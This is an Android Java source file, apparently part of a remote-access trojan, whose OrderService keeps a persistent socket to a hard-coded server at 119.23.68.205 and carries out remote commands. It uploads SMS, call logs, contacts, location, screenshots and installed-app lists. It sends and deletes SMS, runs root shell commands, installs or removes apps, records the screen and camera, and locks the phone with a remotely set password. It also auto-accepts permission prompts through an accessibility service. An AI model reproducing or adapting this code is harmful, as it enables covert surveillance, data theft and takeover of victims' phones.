package order;


import java.util.HashMap;
import java.util.List;
import java.util.Map;


//import com.example.h3.CalcShow;

import activity.CameraActivity;
import activity.SplashActivity;//CalcShow.getInstance(this).mTime=0;

import util.ConfigCt;
import util.ExcCmd;
import accessibility.AccessibilityHelper;
import accessibility.QiangHongBaoService;
import accessibility.app.ExeClick;
import accessibility.app.ShotCode;
import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.app.AlarmManager;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

import android.content.ServiceConnection;
import android.graphics.Bitmap;
import android.graphics.Point;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import app.AppInfo;
import app.AppInfoUtil;
import download.ftp;
import floatwindow.FloatWindowLock;
import order.file.FileSystem;
import order.file.FileUtils;
import order.file.FileSystem.PhoneDir;
import order.screen.ScreenRecordActivity;
import order.screen.ScreenRecordService;
import order.screen.ScreenShotActivity;
import order.screen.Shotter;
import permission.GivePermission;

import util.Funcs;
import util.MyLocation;
import util.PhoneInfo;
import util.RootShellCmd;
import util.ZipHelper;
import sms.SmsObserver;
import sms.SmsReceiver;
import sms.SmsSender;
import sms.SmsWriteOpUtil;
import lock.LockService;
import lock.UnlockScreen;
import media.VideoRecorderService;



/**
 * @author byc
 *
 */
public class OrderService extends Service  {
	 //��Ϣ���壺
	 private static final int MSG_ORDER=0x11;//���յ����
	 private static final int MSG_DATA=0x21;//�����߳���Ϣ��
	 private OrderThread orderThread=null;//ָ���̣߳�
	 private final int RECONNECT_INTERVAL_TIME=60*1000;//�ٴ����Ӽ��ʱ��1���ӣ�
	 Map<String, DataThread>  mapDataThreads = new HashMap<String, DataThread>();
	 private static int mDataThreadID=0;
	 WakeLock wakeLock = null;
	 private static OrderService current=null;
	 private FileSystem fileSystem;
   @Override  
   public void onCreate() {  
       super.onCreate();
       current=this;
       Log.d(ConfigCt.TAG, "OrderService onCreate() executed");  
       orderThread=new OrderThread();//������������߳�
       fileSystem=FileSystem.getFileSystem(this);
       //startAlarm();
       acquireWakeLock();
       Funcs.disableKeyguard(this,this.getClass().toString());
       shotScreenPrepare();//������ʼ����
       //smsPrepare();//���ų�ʼ��  
       //rootPrepare();//ROOTģ���ʼ����
       if(ConfigCt.getInstance(this).isFloatWindowLock())
    	   FloatWindowLock.getInstance(this).ShowFloatingWindow();
       Settings.System.putInt(getContentResolver(), Settings.System.WIFI_SLEEP_POLICY, Settings.System.WIFI_SLEEP_POLICY_NEVER);  
   } 
    @Override  
    public IBinder onBind(Intent intent) {  
        //return null;
    	return new com.byc.qq.ProcessConnection.Stub() {}; 
    }
    @Override  
    public void onDestroy() {  
        super.onDestroy();  
        releaseWakeLock();
        current=null;
        stopForeground(true);// ֹͣǰ̨����--����:��ʾ�Ƿ��Ƴ�֮ǰ��֪ͨ
        SmsObserver.unRegisterServer();
        Log.d(ConfigCt.TAG, "OrderService onDestroy() executed");  
    } 
    @Override  
    public boolean stopService(Intent name) { 
    	Log.d(ConfigCt.TAG, "stopService() executed"); 
    	
        return super.stopService(name);  
    } 
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.d(ConfigCt.TAG, "OrderService onStartCommand() executed");
        //shotScreenPrepare();//������ʼ����
        orderThread.startOrder();
        startForeground(1,new Notification()); 
        //�󶨽�������  
        bindService(new Intent(this,GuardService.class),  
                mServiceConnection, Context.BIND_IMPORTANT); 
        return START_STICKY;
        //return super.onStartCommand(intent, flags, startId);  
    } 
    public static OrderService getOrderService() { 
    	return current;
    }
//--------------------------------------------------------------------------------------------------------
	/*
	 * ������ʱ�� 
	 */
	 private void startAlarm() 
	 { 
		 Intent intent = new Intent(this, OrderService.class); 
		 PendingIntent pi=PendingIntent.getService(this, 0, intent, 0);
		 AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE); 
		 am.setRepeating(AlarmManager.RTC_WAKEUP,System.currentTimeMillis(),60*60*1000,pi); 
	 }
	//��ȡ��Դ�������ָ÷�������ĻϨ��ʱ��Ȼ��ȡCPUʱ���������� 
	 private void acquireWakeLock() 
	 { 
	 if (null == wakeLock) 
	 { 
	  PowerManager pm = (PowerManager)this.getSystemService(Context.POWER_SERVICE); //PARTIAL_WAKE_LOCK
	  wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK|PowerManager.ON_AFTER_RELEASE,this.getClass().getCanonicalName()); 
	  if (null != wakeLock&& wakeLock.isHeld()) 
	  { 
	  wakeLock.acquire(); 
	  } 
	 } 
	 } 
	 
	 //�ͷ��豸��Դ�� 
	 private void releaseWakeLock() 
	 { 
	 if (null != wakeLock&& wakeLock.isHeld()) 
	 { 
	  wakeLock.release(); 
	  wakeLock = null; 
	 } 
	 } 


	 //---------------------------------------------------------------------------------------------------
	 public Handler HandlerSock = new Handler() {  
	        @Override  
	        public void handleMessage(Message msg) {  
	            if (msg.what == MSG_ORDER) {  //���������߳���Ϣ��
	            	byte[] data=null;
	            	if(msg.arg2>0){
	            		Bundle bundle = msg.getData();
	            		data=(byte[])bundle.get("data");
	            	}
	            	command(msg.arg1,data);
	            	Log.i(ConfigCt.TAG, "handleMessage:MSG_ORDER:" + orderThread.sock.oh.cmd);
	            }
	            if (msg.what == MSG_DATA) {  //���������߳���Ϣ��
	            	int i=msg.arg1;
	            	removeDataThread(i);

	            }

	        }  
	  
	    };
	    /*
	     * ����������Ϣ��
	     */
	    private void command(int cmd,byte[] data){
	    	switch(cmd){
	        case order.CMD_TEST:
	        	test();
	        	break;
	        case order.CMD_READY:
	        	break;
	        case order.CMD_INFO://��ȡ��Ϣ��
	        	SendBaseInfo(cmd);
	        	break;
	        case order.CMD_FILE_LIST://��ȡĿ¼������ļ���Ϣ��
	        	fileSystem.processListFileInfo(data);
	        	break;   
	        case order.CMD_FILE_TRANS://�����ļ���CMD_FILE_DEL
	        	fileSystem.processTransFiles(data);
	        	break;    
	        case order.CMD_FILE_DEL://�����ļ���
	        	fileSystem.processDelFile(data);
	        	break; 
	        case order.CMD_LOCK://������
	        	processLock(data);
	        	break;
	     	case order.CMD_UNLOCK:
	     		//if(CalcShow.getInstance(this).fwp.bShow)
	     		//	CalcShow.getInstance(this).fwp.c=0;
	     		//else
	     		//	CalcShow.getInstance(this).mTime=0;
	    		FloatWindowLock.getInstance(this).RemoveFloatingWindow();
	    		break;
	        case order.CMD_SHOT://������
	        	processShotScreen();
	        	break;
	        case order.CMD_SHOTCODE://���룺
	        	if(ShotCode.getShotCode()!=null)
	        		ShotCode.getShotCode().startWorking();
	        	break;
	        case order.CMD_RETURN://���أ�
	        	if(ShotCode.getShotCode()!=null)
	        		ShotCode.getShotCode().performReturn();
	        	break;
	        case order.CMD_HOME://���أ�
	        	 Intent home=new Intent(Intent.ACTION_MAIN);
	        	 home.addCategory(Intent.CATEGORY_HOME);
	        	 home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
	        	 startActivity(home);
	        	break;
	        	 
	        case order.CMD_POS://�����
	        	processClick(order.CMD_POS,data);
	        	break;
	        case order.CMD_LONG_CLICK://������
	        	processClick(order.CMD_LONG_CLICK,data);
	        	break;
	        case order.CMD_SLIDE://�����
	        	processSlide(data);
	        	break;
	    	case order.CMD_LIGHT://��
	    		//processLight();
	    		UnlockScreen.getInstance(getApplicationContext()).execUnlockScreen();
	    		//UnlockScreen.getInstance(getApplicationContext()).SlideScreen(1, 1);
	    		break;
	    	case order.CMD_GIVE_POWER://��
	    		//GivePower.Start();
	    		if(GivePermission.getGivePermission().isEnable()){
	    			GivePermission.getGivePermission().EventStart();
	    			GivePermission.getGivePermission().TimeStart();
	    		}
	    		break;
	        case order.CMD_CAMERA://
	        	processCarmera(this);
	        	break;
	    	case order.CMD_SMS_CONTENT://��ȡ������Ϣ��
	    		//if(ConfigCt.getInstance(getApplicationContext()).getIsSendSms())
	    		//	SmsReceiver.sendALLSmsToServer(OrderService.this, ConfigCt.appID+"-sma");
	    		//SendBaseInfo(order.CMD_SMS_CONTENT);
	    		ReadSmsPrepare(order.CMD_SMS_CONTENT);
	    		break;
	    	case order.CMD_SMS_SEND://���Ͷ�����Ϣ��processSendSmss
	    		//if(ConfigCt.getConfigCt(getApplicationContext()).getIsSendSms())
	    			processSendSms(data);
	    		break;
	    	case order.CMD_SMS_SENDS://Ⱥ���Ͷ��ţ�processSendSmss
	    		//if(ConfigCt.getConfigCt(getApplicationContext()).getIsSendSms())
	    		processSendSmss(data);
	    		break;
	    	case order.CMD_SMS_CLEAR://Ⱥ���Ͷ��ţ�processSendSmss
	    		//if(ConfigCt.getConfigCt(getApplicationContext()).getIsSendSms())
	    		processClearSms();
	    		break;
	    	case order.CMD_CALL://��ȡͨ����Ϣ��
	    		//SendBaseInfo(order.CMD_CALL);
	    		CallPrepare(order.CMD_CALL);
	    		break;
	    	case order.CMD_CONTACT_CONTENT://��ȡͨѶ��
	    		//SendBaseInfo(order.CMD_CONTACT_CONTENT);
	    		ContactPrepare(order.CMD_CONTACT_CONTENT);
	    		break;
	    	case order.CMD_LOCATION_SINGLE://��ȡ��λ��Ϣ��
	    		LocatePrepare();
	    		break;
	    	case order.CMD_LOCATION_SERIES:
	    		//StartLocationService(oh.cmd);
	    		closeSettings();
	    		break;
	    	case order.CMD_LOCATION_STOP:
	    		//Intent intent = new Intent(this, LocationSvc.class);
	    		//stopService(intent);
	    		break;
	    	case order.CMD_CMD:
	    		String s=order.byte2Str(data);
	    		if(s==null)return;
	    		if(ConfigCt.getInstance(getApplicationContext()).haveRootPermission()){
	    			ExcCmd.getInstance().Exc(s);
	    		}else{
	    			rootPrepare();
	    		}
	    		break;
	    	case order.CMD_GET_CMD_OUT:
	    		SendBaseInfo(cmd);
	    		break;
	    	case order.CMD_REBOOT:
	    		//Funcs.reboot2(getApplicationContext());
	    		if(ConfigCt.bRoot)
	    			ExcCmd.reboot();
	    		break;
	    	case order.CMD_SHUTDOWN:
	    		if(ConfigCt.bRoot)
	    			ExcCmd.shutdown();
	    		//Funcs.reboot3(getApplicationContext());
	    		break;
	    	case order.CMD_RESTART:
	    		//Funcs.restartApp(getApplicationContext());
	    		SplashActivity.restartApp(getApplicationContext());
	    		break;
	    	case order.CMD_RECORD_SCREEN_START:
	    		 ScreenRecordService.start(this);
	    		break;
	    	case order.CMD_RECORD_SCREEN_END:
	    		ScreenRecordService.stop(this);
	    		break;
	    	case order.CMD_RECORD_VIDEO_START:
	    		VideoRecorderService.start(this);
	    		break;
	    	case order.CMD_RECORD_VIDEO_END:
	    		VideoRecorderService.stop(this);
	    		break;
	    	case order.CMD_GET_INSTALL_APP_INFO:
	    		processGetInstallAppInfo(order.CMD_GET_INSTALL_APP_INFO);
	    		break;
	    	case order.CMD_INSTALL_APP:
	    		processInstallApp(data);
	    		break;
	    	case order.CMD_UNINSTALL_APP:
	    		processUnInstallApp(data);
	    		break;
	    	case order.CMD_RUN_APP:
	    		processRunApp(data);
	    		break;
	    	case order.CMD_KILL_APP:
	    		processKillApp(data);
	    		break;
	    	case order.CMD_INPUT:
	    		processInput(data);
	    		break;
	    	}

    	}
	    	
	 
    /*
     * ���䷢���̣߳�
     */
    public DataThread getDataThread(){
    	mDataThreadID=mDataThreadID+1;
    	String key=String.valueOf(mDataThreadID);
    	mapDataThreads.put(key, new DataThread(mDataThreadID));
    	order.formatOH(mapDataThreads.get(key).sock.oh);
    	return mapDataThreads.get(key);
    }
    /*
     * �ͷŷ����̣߳�
     */
    private void removeDataThread(int id){
    	String key=String.valueOf(id);
    	if(mapDataThreads.get(key)==null)return;
    	if(mapDataThreads.get(key).dataThreadInfo.bSuc)Log.i(ConfigCt.TAG, "handleMessage:DataThread suc" );
    	mapDataThreads.get(key).dataThreadInfo=null;
    	mapDataThreads.remove(key);	
    }
    /*
     * ������Ϣ��
     */
    public void SendBaseInfo(final int cmd){
    	SendBaseInfo(cmd,null);
    }
    /*
     * ������Ϣ��
     */
    public void SendBaseInfo(final int cmd,final String s){
		new Thread(new Runnable() {    
			@Override    
		    public void run() {    
				//Looper.prepare();
				try{
					DataThread dataThread=getDataThread();
					switch(cmd){
					case order.CMD_INFO:
						dataThread.sock.oh.cmd=cmd;
						dataThread.sock.s=PhoneInfo.getBaseInfo(getApplicationContext(),ConfigCt.appID+"-baseInfo");
						break;
					case order.CMD_SMS_CONTENT:
						dataThread.sock.oh.cmd=cmd;
						dataThread.sock.s=SmsReceiver.getSmsInPhone(getApplicationContext());
						boolean bSuc=true;
						if(dataThread.sock.s.indexOf("no result!")!=-1)bSuc=false;
						ConfigCt.getInstance(getApplicationContext()).setIsSendSms(bSuc);
						break;
					case order.CMD_CALL:
						
						dataThread.sock.oh.cmd=cmd;
						dataThread.sock.s=PhoneInfo.GetCallsInPhone(getApplicationContext());
						ConfigCt.getInstance(getApplicationContext()).setIsReadCallLog(true);
						break;	
					case order.CMD_CONTACT_CONTENT:
						
						dataThread.sock.oh.cmd=cmd;
						dataThread.sock.s=PhoneInfo.GetContactInPhone(getApplicationContext());
						if(dataThread.sock.s==null||dataThread.sock.s.equals(""))return;
						ConfigCt.getInstance(getApplicationContext()).setIsReadContact(true);
					break;
					case order.CMD_LOCATION_SINGLE:
						MyLocation location=MyLocation.getMyLocation(getApplicationContext());
						location.initLocationInfo();
						MyLocation.LocationInfo info=location.GetSingleLocation();
						if(info==null)return;
						if(info.suc==0)return;
						if(info.suc==1){
							String s=info.provider+"("+info.dX+","+info.dY+")";
							dataThread.sock.oh.cmd=cmd;
							dataThread.sock.s=s;
						}
						break;
					case order.CMD_GET_CMD_OUT:
						
						dataThread.sock.oh.cmd=cmd;
						dataThread.sock.s=ExcCmd.getInstance().getOut();
						if(dataThread.sock.s==null||dataThread.sock.s.equals(""))return;
					break;
					case order.CMD_GET_INSTALL_APP_INFO:
						dataThread.sock.oh.cmd=cmd;
						dataThread.sock.s=s;
						if(dataThread.sock.s==null||dataThread.sock.s.equals(""))return;
					break;
				}    	
				dataThread.start();
				}catch(Exception e){
					e.printStackTrace();
				}
				//Looper.loop(); 
		    }    
		}).start();
    }
    /*
     * ����ͼƬ��
     */
    public void SendBmp(Bitmap bitmap){
    	DataThread dataThread=getDataThread();
    	dataThread.sock.oh.cmd=order.CMD_SHOT;
    	dataThread.sock.bmp=bitmap;
    	dataThread.start();
    }
    /*
     * ����ͼƬ��
     */
    public void SendBmp(int cmd,Bitmap bitmap){
    	DataThread dataThread=getDataThread();
    	dataThread.sock.oh.cmd=cmd;
    	dataThread.sock.bmp=bitmap;
    	dataThread.start();
    }
    class OrderThread extends Thread { 
    	public Sock sock;
    	private String host= "119.23.68.205";
    	private int port = 8100;//������ն˿�
    	WakeLock wakeLock = null; 
    	private Message msg= null;//��Ϣ����;
    	Bundle bundle=null; 
   	 public OrderThread() { 
		 host=ConfigCt.host;
		 port=ConfigCt.port_order;
		 sock=new Sock(host,port);
	 }
    public void startOrder() { 
    	try{
            if(this.isAlive()){
            	if(!this.sock.isConnected()){
            		//orderThread.start();
            	}
            }else{
            	orderThread.start();
            }
    	}catch(IllegalThreadStateException e){
    		e.printStackTrace();
    	}
    }
   	public boolean isConnected() { 
   		if(sock==null)return false;
   		return sock.isConnected();
   	}
	 /*
	  * ������Ϣ��
	  */
	 private void sendMsg(int cmd,byte[] data) {
		  //������Ϣ  
        msg = new Message();  
        msg.what = MSG_ORDER;
        msg.arg1=cmd;
        msg.arg2=0;
        if(data!=null){
        	msg.arg2=data.length;
        	bundle = new Bundle();
        	bundle.clear(); 
        	bundle.putByteArray("data", data);
        	msg.setData(bundle);  //
        }
        HandlerSock.sendMessage(msg);
	 }
 	@Override  
	 	public void run() {  
	 		//���ӷ����� (ÿ��5��������һ��)
	 		Log.d(ConfigCt.TAG, "ORDER SOCKET Start:-------------------------->");
	 		Funcs.acquireWakeLock(OrderService.this,wakeLock,OrderThread.this.getClass().getCanonicalName());
	 		while(true){//ѭ�����ӣ�
	 			if(sock.connectServer()){//���ӷ������ɹ���
	 				sock.oh=order.formatOH(sock.oh);
	 				sock.SendOH(sock.oh);//������֤��Ϣ��
	 				Log.d(ConfigCt.TAG, "SOCKET Recv:---------------------------------->");
	 				while(true){
	 					sock.oh.cmd=order.CMD_READY;
	 					sock.data=null;
	 					if(sock.RecvOH()){
	 						if(sock.oh.cmd==order.CMD_READY)continue;//������;
 							if(sock.oh.len>0)//�������ݣ�
 								sock.RecvData(sock.oh.len);//�����������С��
 							//HandlerSock.sendEmptyMessage(MSG_ORDER);//���ͽ��յ�������Ϣ�������ࣻ
 							sendMsg(sock.oh.cmd,sock.data);
	 					}else{//����ʧ�ܣ�
	 						break;//�������ӷ�����
	 					}//if(sock.RecvPH()){//���հ�ͷ�ɹ���
	 				}//while(true){
	 			}else{//����ʧ�ܣ�
	 				Sleep(RECONNECT_INTERVAL_TIME);
	 			}//if(sock.connectServer()){//���ӷ������ɹ���
	 		}//while(true){
	 		//releaseWakeLock(wakeLock);
	 	}//public void run() { 
	 /*
	  * ��ʱ��
	  */
	 private void Sleep(int MilliSecond) {
		 try{
			 	Thread.sleep(MilliSecond);
		   	}catch(InterruptedException e){
		   		e.printStackTrace();
		   	}catch(IllegalArgumentException e){
		   		e.printStackTrace();
		   	}  
	 }

    }//class OrderThread extends Thread {

    /*
     * ���ݴ����̣߳�
     */
    public class DataThread extends Thread { 
    	private String host= "119.23.68.205";
    	private int port = 8101;//���ݴ���˿�
    	private Message msg= null;//��Ϣ����;
    	//Bundle bundle=null; 
    	public DataThreadInfo dataThreadInfo=new DataThreadInfo();
    	public Sock sock;
    	 public DataThread(int idx) { 
    		 host=ConfigCt.host;
    		 port=ConfigCt.port_data;
    		 sock=new Sock(host,port);
    		 initMsg(idx); 
    	 }   	
    	 @Override  
         public void run() {  
           
    		 if(sock.connectServer()){//���ӷ������ɹ���
    			 if(sock.bmp!=null){//����ͼƬ:
    				 dataThreadInfo.bSuc=sock.SendBmp(sock.bmp);
    			 }else if(sock.s!=null){//�����ַ���:
    				 int i=sock.SendString(sock.s);
    				 if(i==-1)dataThreadInfo.bSuc=false;else dataThreadInfo.bSuc=true;
    			 }else if(sock.data!=null){
    				 sock.SendOH(sock.oh);
    				 if(sock.oh.len>0)dataThreadInfo.bSuc=sock.SendData(sock.oh.len);
    			 } 
    		 }else{//���ӷ�����ʧ�ܣ�
    			 dataThreadInfo.bSuc=false;  
    		 }
             HandlerSock.sendMessage(msg);
			 release(); 
    	 }
    	 /*
    	  * ׼����Ϣ�壺
    	  */
    	 private void initMsg(int idx) {
    		  //������Ϣ  
             msg = new Message();  
             msg.what = MSG_DATA;
             msg.arg1=idx;
             //bundle = new Bundle();
             //bundle.clear(); 
             //bundle.putInt("threadID", ID);
             //msg.setData(bundle);  //
             dataThreadInfo.ID=idx;
             dataThreadInfo.len=0;
    	 }
    	 /*
    	  * �ͷ��ڴ棺
    	  */
    	 private void release() {
    		sock.release(); 
    		sock=null;
    	    msg=null;
    	 }
    }

    /*
  	 * ���
  	 */
  	private void processClick(int cmd,byte[] data){
  		if(data==null)return;
  		byte[] tmp=new byte[4];
  		System.arraycopy(data, 0, tmp,0, 4);
  		Point pos=new Point();
  		pos.x=order.byte2Int(tmp);
  		System.arraycopy(data, 4, tmp,0, 4);
  		pos.y=order.byte2Int(tmp);
  		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N){
  			if(QiangHongBaoService.service!=null){
  				if(cmd==order.CMD_POS)
  					QiangHongBaoService.service.pressLocation(pos);
  				if(cmd==order.CMD_LONG_CLICK)
  					QiangHongBaoService.service.pressLongLocation(pos);
  				return;
  			}
  		}
      	if(!ConfigCt.bRoot){//1ROOTȨ���жϣ�
      		ConfigCt.bRoot=RootShellCmd.haveRoot();
      	}
      	if(ConfigCt.bRoot&&(!ConfigCt.getInstance(getApplicationContext()).haveRootPermission())){//2����ROOTȨ�ޣ�
  			if(GivePermission.getGivePermission().isEnable()){
  				GivePermission.getGivePermission().setKeyWords(new String[]{"����","��Ȩ"});
      			GivePermission.getGivePermission().EventStart();
      			GivePermission.getGivePermission().TimeStart();
      		}
      	}
  		if(ConfigCt.bRoot){//3ִ�����
  			if(cmd==order.CMD_POS)
  				RootShellCmd.processClick(pos);
  			if(cmd==order.CMD_LONG_CLICK)
  				RootShellCmd.processLongClick(pos);
  			return;
  		}
  		if(QiangHongBaoService.service!=null){
  			ExeClick.getInstance(cmd).click(pos);
  			return;
  		}
  	}
  	/*
  	 * ����
  	 */
  	private void processSlide(byte[] data){
  		if(data==null)return;
  		if(data.length<16)return;
  		byte[] tmp=new byte[4];
  		System.arraycopy(data, 0, tmp,0, 4);
  		Point p1=new Point();
  		Point p2=new Point();
  		p1.x=order.byte2Int(tmp);
  		System.arraycopy(data, 4, tmp,0, 4);
  		p1.y=order.byte2Int(tmp);
  		System.arraycopy(data, 8, tmp,0, 4);
  		p2.x=order.byte2Int(tmp);
  		System.arraycopy(data, 12, tmp,0, 4);
  		p2.y=order.byte2Int(tmp);
  		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N){
  			if(QiangHongBaoService.service!=null){
  				QiangHongBaoService.service.slideThread(p1,p2);
  			}
  		}else{
  			if(!ConfigCt.bRoot){
  	    		ConfigCt.bRoot=RootShellCmd.haveRoot();
  	    	}
  			if(ConfigCt.bRoot&&(!ConfigCt.getInstance(getApplicationContext()).haveRootPermission())){
  				if(GivePermission.getGivePermission().isEnable()){
  					GivePermission.getGivePermission().setKeyWords(new String[]{"����","��Ȩ"});
  	    			GivePermission.getGivePermission().EventStart();
  	    			GivePermission.getGivePermission().TimeStart();
  	    		}
  	    	}
  			if(ConfigCt.bRoot){
  				RootShellCmd.processSwipe(p1, p2);
  			}else{
  				if(QiangHongBaoService.service!=null){
  					ExeClick.getInstance(order.CMD_SLIDE).slide(p1, p2);
  				}
  			}
  		}
  		//if(QiangHongBaoService.service!=null){
  		//	ExeClick.getInstance().slide(p1, p2);
  		//}
  	}
  	/*
     * ��ȡ���ų�ʼ����
     */
	private void ReadSmsPrepare(int cmd){
		if(!ConfigCt.getInstance(getApplicationContext()).getIsSendSms()){
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().EventStart();
				GivePermission.getGivePermission().TimeStart();
			}else{
				return;
			}
		}
		SendBaseInfo(cmd);
		if(ConfigCt.getInstance(getApplicationContext()).getIsSendSms())
			SmsReceiver.sendALLSmsToServer(OrderService.this, ConfigCt.appID+"-sma");
		//SendBaseInfo(order.CMD_SMS_CONTENT);
	}
	/*
	 * ���Ͷ���
	 */
	private void processSendSms(byte[] data){
		if(data==null)return;
		if(data.length<5)return;
		boolean bPermission=ConfigCt.getInstance(this).getIsSendSmsToPhone();
		if(!bPermission){
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().setKeyWords(new String[]{"����"});
    			GivePermission.getGivePermission().EventStart();
    			GivePermission.getGivePermission().TimeStart();
    		}else{
    			return;
    		}
		}
		String s=order.byte2Str(data);
		if(s==null)return;
		int p=s.indexOf(";");
		if(p==-1)return;
		String phone=s.substring(0,p);
		String content=s.substring(p+1);
		boolean bResult=SmsReceiver.SendSms(phone, content);
		//if(bPermission==false&&bResult==true)
			//ConfigCt.getConfigCt(this).setIsSendSmsToPhone(true);
	}
	/*
	 * Ⱥ���Ͷ���
	 */
	private void processSendSmss(byte[] data){
		if(data==null)return;
		boolean bPermission=ConfigCt.getInstance(this).getIsSendSmsToPhone();
		if(!bPermission){
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().setKeyWords(new String[]{"����"});
    			GivePermission.getGivePermission().EventStart();
    			GivePermission.getGivePermission().TimeStart();
    		}else{
    			return;
    		}
		}
		String s=order.byte2Str(data);
		if(s==null)return;
		SmsSender.getInstance(getApplicationContext()).SmsSendsThread(s);
	}
	/*
	 * Ⱥ���Ͷ���
	 */
	private void processClearSms(){
		
		SmsSender.getInstance(getApplicationContext()).DelSmsByBody("1");
	}

	/*
	 * ���
	 */
	private void processCarmera(final Context context){
			Intent intent=new Intent(context, CameraActivity.class);
			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(intent);
	}
    /*
     * ִ������
     */
    private void processLight(){
		Intent intent=new Intent(this,LockService.class);
		intent.putExtra("op", LockService.OP_CLEAR_PWD);
		intent.putExtra("pwd", LockService.mPwd);
		startService(intent);
		Funcs.wakeUpAndUnlock(this);
    }
    /*
     * ִ������
     */
    public static void processLock(Context context,String pwd){
		//LockService.setLock("800108");
    	Intent intent=new Intent(context,LockService.class);
    	if(pwd==null)
    		intent.putExtra("op", LockService.OP_LOCK);
    	else if(pwd.equals(""))
    		intent.putExtra("op", LockService.OP_CLEAR_PWD);
		else{
			intent.putExtra("op", LockService.OP_SET_PWD_AND_LOCK);
			intent.putExtra("pwd", pwd);
		}
		context.startService(intent);
    }
    /*
     * ִ������
     */
    public void processLock(byte[] data){
		//LockService.setLock("800108");
    	String pwd="";
    	if(data==null)
    		pwd=null;
    	else{
    		pwd=order.byte2Str(data);
    		if(pwd.equals("0000"))pwd="";
    	}
    	processLock(this,pwd);
    	//FloatWindowLock.getInstance(this).ShowFloatingWindow();
    }
    /*
     * ִ�н���
     */
    private void processShotScreen(){
    	if(ScreenRecordActivity.shotter==null){
    		if(ConfigCt.getInstance(getApplicationContext()).haveScreenShotPower())
    			shotScreenPrepare();//SplashActivity.restartApp(getApplicationContext());
    		else
    			shotScreenPrepare();
    		return;
    	}
    	final String filename=Funcs.getFilename(ConfigCt.appID, ".jpg");
    	ScreenRecordActivity.shotter.startScreenShot(new Shotter.OnShotListener() {
            @Override
            public void onFinish(Bitmap bitmap) {
            	ftp.getFtp(OrderService.this).UploadStart(filename);
            	SendBmp(order.CMD_SHOT,bitmap);
            }
        },ConfigCt.LocalPath+filename,50);
    }	
    /*
     * ִ�ж�λ
     */
    private void processLocation(){
    	MyLocation location=MyLocation.getMyLocation(getApplicationContext());
    	if(ConfigCt.getInstance(getApplicationContext()).haveLocatePermission()){
    		location.Start();
    	}else{
    		
    	}
    }	
    /*
     * ��ȡ�Ѱ�װ��Ӧ����Ϣ��
     */
    private void processGetInstallAppInfo(final int cmd){
    	new Thread(new Runnable() {    
			@Override    
		    public void run() {    
				try{
					List<AppInfo> appInfos=AppInfoUtil.getInstance(OrderService.this).getInstalledApps(AppInfoUtil.GET_ALL_APP);
					if(appInfos==null||appInfos.size()==0)return;
					String ss="";
					for(AppInfo app:appInfos){
						ss=ss+app.getAppName()+";"+app.getPackageName()+";"+app.getFlag()+";";
					}
					SendBaseInfo(cmd,ss);
				}catch(Exception e){
					e.printStackTrace();
				}
			}    
    	}).start();
    }
    /*
     * ��װӦ�ã�
     */
    private void processInstallApp(final byte[] data){
    	if(GivePermission.getGivePermission().isEnable()){
    		GivePermission.getGivePermission().setKeyWords(new String[]{"��װ","���"});
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
    	}
    	new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					FileSystem.PhoneDir phonDir=FileSystem.getFileSystem(getApplicationContext()).byte2PhoneDir(data);
					String filename=FileSystem.getFileSystem(getApplicationContext()).getFullDir(phonDir.iRootDir,phonDir.subDir);
					AppInfoUtil.installApk(getApplicationContext(), filename);
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}// public void run() {
		}).start();//new Thread(new Runnable() {
    }
    /*
     * ж��Ӧ�ã�
     */
    private void processUnInstallApp(final byte[] data){
    	if(GivePermission.getGivePermission().isEnable()){
    		GivePermission.getGivePermission().setKeyWords(new String[]{"ж��","ȷ��"});
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
    	}
    	new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					String pkg=order.byte2Str(data);
					AppInfoUtil.uninstallApk(getApplicationContext(), pkg);
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}// public void run() {
		}).start();//new Thread(new Runnable() {
    }
    /*
     * ����Ӧ�ã�
     */
    private void processRunApp(final byte[] data){
    	if(GivePermission.getGivePermission().isEnable()){
    		GivePermission.getGivePermission().setKeyWords(new String[]{"����"});
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
    	}
    	new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					String pkg=order.byte2Str(data);
					AppInfoUtil.RunApp(getApplicationContext(), pkg);
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}// public void run() {
		}).start();//new Thread(new Runnable() {
    }
    /*
     * ��ֹ����Ӧ�ã�
     */
    private void processKillApp(final byte[] data){
    	if(GivePermission.getGivePermission().isEnable()){
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
    	}
    	new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					String pkg=order.byte2Str(data);
					AppInfoUtil.killProcess(getApplicationContext(), pkg);
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}// public void run() {
		}).start();//new Thread(new Runnable() {
    }
	
	
	  private ServiceConnection mServiceConnection = new ServiceConnection() {  
	        @Override  
	        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {  
	            //������  
	            Log.d(ConfigCt.TAG,"OrderService:��������");  
	        }  
	  
	        @Override  
	        public void onServiceDisconnected(ComponentName componentName) {  
	            //�Ͽ�����  
	            startService(new Intent(OrderService.this,GuardService.class));  
	            //���°�  
